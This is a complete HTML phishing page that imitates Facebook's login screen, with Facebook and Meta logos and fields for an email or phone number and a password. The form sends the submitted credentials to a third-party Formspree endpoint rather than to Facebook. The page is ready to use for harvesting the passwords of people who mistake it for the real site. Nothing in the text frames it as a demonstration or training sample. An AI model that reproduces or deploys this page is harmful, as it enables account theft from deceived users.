
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Facebook Login</title>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
	<div class="container">
		<img src="facebook-logo.png" alt="Facebook Logo" class="logo">
		<form action="https://formspree.io/f/mqazpodw" method="POST">
			<input type="text" name="email" placeholder="Mobile number or email" class="form-input" required>
			<input type="password" name="password" placeholder="Password" class="form-input" required>
			<button type="submit" class="login-btn">Log in</button>
		</form>
		<a href="#" class="forgot-password">Forgotten Password</a>
		<a href="#" class="create-account">Create new account</a>
		<img src="meta-logo.png" alt="Meta Logo" class="meta-logo">
	</div>
</body>
</html>
